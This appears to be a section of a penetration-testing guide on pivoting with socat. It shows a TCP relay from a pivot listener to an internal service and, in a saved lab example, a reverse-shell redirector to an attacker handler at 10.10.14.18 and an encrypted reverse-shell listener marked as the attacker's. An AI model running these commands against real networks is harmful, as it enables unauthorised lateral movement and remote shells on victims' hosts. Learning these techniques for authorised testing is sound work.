## Current operation: Relay one TCP service from a pivot listener

**Run in:** Pivot Linux shell. **Requires:** An assigned pivot address, a free listening port and a route from the pivot to the internal web service.

```bash
socat TCP-LISTEN:8080,bind=PIVOT_IP,reuseaddr,fork TCP:INTERNAL_IP:80
```

**Read the result:** Identify both address specifications: one receives or reads, the other connects or writes.

**If The listener accepts connections but immediately closes them:** Listener placement, EXEC versus file output, PTY options and byte-stream behavior are distinct; a malformed address can silently select the wrong direction.

**Next check:** Test INTERNAL_IP:80 from the pivot; a relay transports bytes and does not repair application hostnames or authentication.

**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.

### Example 2: socat: Relays and Shell Redirectors

Run in: **Saved lab example**.

```bash
# relay: anything hitting the pivot's :8080 → forwarded to internal target :80
socat TCP-LISTEN:8080,fork TCP:172.16.5.5:80
# reverse-shell redirector: pivot listens :8080, forwards to YOUR handler :80
socat TCP-LISTEN:8080,fork TCP:10.10.14.18:80
# fully-encrypted reverse shell (attacker)
socat -d -d OPENSSL-LISTEN:4443,cert=shell.pem,verify=0,fork STDOUT
```
